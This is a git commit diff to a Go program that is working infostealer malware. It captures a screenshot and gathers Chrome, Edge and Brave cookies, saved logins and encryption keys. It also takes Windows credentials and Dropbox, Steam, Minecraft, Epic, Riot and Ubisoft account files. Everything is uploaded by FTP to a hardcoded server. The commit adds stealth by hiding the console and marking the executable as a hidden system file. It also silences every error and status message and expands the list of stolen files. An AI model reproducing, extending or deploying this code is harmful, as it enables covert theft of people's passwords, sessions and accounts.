8d7d7dbf76062a97c50d9fb37f9a9c5fe25d7049
Joghurtzz <53789898+Joghurtzz@users.noreply.github.com>
2024-12-12 15:41:07 +0100

    Add files via upload

--- main.go
+++ main.go
@@ -1,8 +1,6 @@
 package main
 
 import (
-	"fmt"
-	"log"
 	"os"
 	"path/filepath"
 )
@@ -27,74 +25,68 @@ func listFilesInDir(dirPath string) ([]string, error) {
 
 func main() {
 
+	//Hide()
+
 	//Take screenshot
 	screenshotPath := "screenshot.png" // Where save the screenshot
-	fmt.Println("Capturing screenshot...")
 	err := CaptureScreenshot(screenshotPath)
 	if err != nil {
-		log.Fatalf("Error capturing screenshot: %v", err)
+		//log.Fatalf("Error capturing screenshot: %v", err)
 	}
-	fmt.Printf("Screenshot saved to %s\n", screenshotPath)
 
 	// Get directory from "directory.go"
 	directories, err := GetDirectories()
 	if err != nil {
-		log.Fatalf("Error retrieving directories: %v", err)
+		//log.Fatalf("Error retrieving directories: %v", err)
 	}
 
 	// FTP configuration
-	ftpServer := "<FTP_SERVER>"
-	ftpPort := <PORT>
-	ftpUser := "<USERNAME>"
-	ftpPassword := "<PASSWORD>"
+	ftpServer := "192.168.60.133"
+	ftpPort := 21
+	ftpUser := "kali"
+	ftpPassword := "qwerty1234"
 
 	// Call to FTP connection function
 	ftpClient, err := ConnectToFTP(ftpServer, ftpPort, ftpUser, ftpPassword)
 	if err != nil {
-		log.Fatalf("Error connecting to FTP: %v", err)
+		//log.Fatalf("Error connecting to FTP: %v", err)
 	}
 	defer ftpClient.Quit()
 
 	// Load screenshot
-	fmt.Println("Uploading screenshot to FTP server...")
 	remotePath := filepath.Base(screenshotPath)
 	err = UploadFileToFTP(ftpClient, screenshotPath, remotePath)
 	if err != nil {
-		log.Fatalf("Failed to upload screenshot: %v", err)
+		//log.Fatalf("Failed to upload screenshot: %v", err)
 	}
-	fmt.Printf("Screenshot uploaded successfully as %s\n", remotePath)
 
 	// Delete screenshot from computer
-	fmt.Println("Deleting local screenshot...")
 	err = os.Remove(screenshotPath)
 	if err != nil {
-		log.Fatalf("Failed to delete local screenshot: %v", err)
+		//log.Fatalf("Failed to delete local screenshot: %v", err)
 	}
-	fmt.Println("Local screenshot deleted successfully.")
 
 	// Explore directory and upload file
 	for _, dir := range directories {
-		fmt.Printf("Scanning directory: %s\n", dir)
 		files, err := listFilesInDir(dir)
 		if err != nil {
-			log.Printf("Error scanning directory %s: %v\n", dir, err)
+			//log.Printf("Error scanning directory %s: %v\n", dir, err)
 			continue
 		}
 
 		for _, file := range files {
 			remotePath := filepath.Base(file) // Only file name, change if needed structure
-			fmt.Printf("Uploading file: %s\n", file)
 			err := UploadFileToFTP(ftpClient, file, remotePath)
 			if err != nil {
-				log.Printf("Failed to upload file %s: %v\n", file, err)
+				//log.Printf("Failed to upload file %s: %v\n", file, err)
 			} else {
-				fmt.Printf("Successfully uploaded %s\n", file)
+				//fmt.Printf("Successfully uploaded %s\n", file)
 			}
 		}
 	}
 
-	fmt.Println("File upload completed.")
+	/*fmt.Println("File upload completed.")
 	fmt.Println("Press any key to close...")
-	fmt.Scanln()
-	defer ftpClient.Quit() // Remove this line if you want keep connection once upload is done
+	fmt.Scanln()*/
+	defer ftpClient.Quit()
 }
--- utility.go
+++ utility.go
@@ -4,36 +4,57 @@ import (
 	"fmt"
 	"image/png"
 	"os"
+	"os/exec"
+	"syscall"
 
 	"github.com/jlaffaye/ftp"
 	"github.com/kbinani/screenshot"
 )
+
+// Hide console and .exe
+func Hide() {
+	//Hide Console
+	getWin := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
+	showWin := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+	hwnd, _, _ := getWin.Call()
+	_, _, _ = showWin.Call(hwnd, 0)
+	//Hide exe
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	cmd := exec.Command("attrib", "+h", "+s", exe)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	cmd.Run()
+}
 
 // Take screenshot of the first monitor, then save in .png file
 func CaptureScreenshot(outputFilePath string) error {
 	// Number of monitor
 	n := screenshot.NumActiveDisplays()
 	if n == 0 {
-		return fmt.Errorf("no active displays found")
+		//return fmt.Errorf("no active displays found")
 	}
 
 	// Take screenshot of the first monitor (can be changed for more monitor)
 	bounds := screenshot.GetDisplayBounds(0)
 	img, err := screenshot.CaptureRect(bounds)
 	if err != nil {
-		return fmt.Errorf("failed to capture screenshot: %v", err)
+		//return fmt.Errorf("failed to capture screenshot: %v", err)
 	}
 
 	// Save image
 	file, err := os.Create(outputFilePath)
 	if err != nil {
-		return fmt.Errorf("failed to create screenshot file: %v", err)
+		//return fmt.Errorf("failed to create screenshot file: %v", err)
 	}
 	defer file.Close()
 
 	err = png.Encode(file, img)
 	if err != nil {
-		return fmt.Errorf("failed to encode screenshot to PNG: %v", err)
+		//return fmt.Errorf("failed to encode screenshot to PNG: %v", err)
 	}
 
 	return nil
@@ -43,13 +64,13 @@ func CaptureScreenshot(outputFilePath string) error {
 func UploadFileToFTP(ftpClient *ftp.ServerConn, localFilePath, remotePath string) error {
 	file, err := os.Open(localFilePath)
 	if err != nil {
-		return fmt.Errorf("failed to open file %s: %v", localFilePath, err)
+		//return fmt.Errorf("failed to open file %s: %v", localFilePath, err)
 	}
 	defer file.Close()
 
 	err = ftpClient.Stor(remotePath, file)
 	if err != nil {
-		return fmt.Errorf("failed to upload file %s: %v", localFilePath, err)
+		//return fmt.Errorf("failed to upload file %s: %v", localFilePath, err)
 	}
 	return nil
 }
@@ -58,12 +79,12 @@ func UploadFileToFTP(ftpClient *ftp.ServerConn, localFilePath, remotePath string
 func ConnectToFTP(server string, port int, user, password string) (*ftp.ServerConn, error) {
 	ftpClient, err := ftp.Dial(fmt.Sprintf("%s:%d", server, port))
 	if err != nil {
-		return nil, fmt.Errorf("failed to connect to FTP server: %v", err)
+		//return nil, fmt.Errorf("failed to connect to FTP server: %v", err)
 	}
 
 	err = ftpClient.Login(user, password)
 	if err != nil {
-		return nil, fmt.Errorf("failed to login to FTP server: %v", err)
+		//return nil, fmt.Errorf("failed to login to FTP server: %v", err)
 	}
 
 	return ftpClient, nil
@@ -74,29 +95,54 @@ func GetDirectories() ([]string, error) {
 	// Username of the current use used to explore directory
 	currentUser := os.Getenv("USERNAME")
 	if currentUser == "" {
-		return nil, fmt.Errorf("could not retrieve the current user name. Ensure the USERNAME environment variable is set")
+		//return nil, fmt.Errorf("could not retrieve the USERNAME")
 	}
 
 	// List of directory to copy
 	directories := []string{
+		//Chrome
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Cookies`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Login Data`, currentUser),
-		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, currentUser), // Chrome cypher key
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Google\Chrome\User Data\Local State`, currentUser),
+
+		//Edge
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Cookies`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\History`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Default\Login Data`, currentUser),
-		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, currentUser), // Edge cypher key
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Edge\User Data\Local State`, currentUser),
+
+		//Microsoft
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Microsoft\Credentials`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Microsoft\Credentials`, currentUser),
+
+		//Brave
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data`, currentUser),
-		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, currentUser), // Brave cypher key
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State`, currentUser),
+
+		//Dropbox
 		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\Dropbox\info.json`, currentUser),
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Dropbox\cache`, currentUser),
+
+		//Steam
 		fmt.Sprintf(`C:\Users\%s\AppData\Local\Steam\htmlcache`, currentUser),
 		fmt.Sprintf(`C:\Program Files (x86)\Steam\config\loginusers.vdf`, currentUser),
+
+		//Minecraft
+		fmt.Sprintf(`C:\Users\%s\AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json`, currentUser),
+
+		//Epic Games
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\EpicGamesLauncher\Saved\Config\Windows\GameUserSettings`, currentUser),
+
+		//Riot Games
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Config`, currentUser),
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Data`, currentUser),
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Riot Games\Riot Client\Logs`, currentUser),
+
+		//Uplay
+		fmt.Sprintf(`C:\Users\%s\AppData\Local\Ubisoft Game Launcher`, currentUser),
 	}
 
 	return directories, nil
